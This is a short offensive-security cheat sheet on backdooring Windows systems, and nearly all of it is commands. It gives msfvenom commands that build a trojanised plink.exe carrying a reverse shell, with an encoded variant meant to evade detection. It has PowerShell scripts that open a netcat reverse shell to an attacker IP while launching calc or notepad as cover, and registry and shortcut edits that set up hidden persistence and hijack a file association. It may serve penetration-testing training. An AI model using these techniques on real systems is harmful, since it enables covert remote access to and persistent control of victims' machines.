# Backdoors

## Backdoor Cheat Sheet

### Methods

1. Creating EXE Files
2. Backdooring Shortcuts
3. Startup Scripts
4. Backdooring file associations

***

### Create an EXE file

#### msfvenom

```
# Without encoding
sudo msfvenom -a x64 --platform windows -x /usr/share/windows-binaries/plink.exe -k -p windows/x64/shell_reverse_tcp LHOST=192.168.56.20 LPORT=4444 -b "\x00" -f exe -o plink-malicious.exe

# With encoding
sudo msfvenom -a x64 --platform windows -x /usr/share/windows-binaries/plink.exe -k -p windows/x64/shell_reverse_tcp LHOST=192.168.56.20 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 4 -f exe -o plink-malicious.exe

```

### Backdooring Shortcuts

#### Powershell

**script.ps1**

```
Start-Proces -NoNewWindow "C:\tools\nc64.exe" "-e cmd.exe <attacker ip> <port>"

C:\Windows\System32\calc.exe

```

**Modify the shortcut properties**

```
//Change Target Field
powershell -WindowStyle hidden C:\Windows\System32\script.ps1

```

### Startup Scripts

#### Registry Editor

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### Backdooring file associations

#### backdoor.ps1

```
Start-Proces -NoNewWindow "C:\tools\nc64.exe" "-e cmd.exe <attacker ip> <port>"

C:\Windows\System32\NOTEPAD.exe $args[0]

```

#### Registry Editor

```
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\testfile\shell\open\command


# Change "value data" field
powershell -Windowstyle hidden C:\Windows\System32\backdoor.ps1
```

***

## REFERENCES

* https://devblogs.microsoft.com/powershell/how-to-access-or-modify-startup-items-in-the-window-registry/
* https://app.tidalcyber.com/technique/9cfbe3ba-957e-49fd-9494-9870e5d0ae16
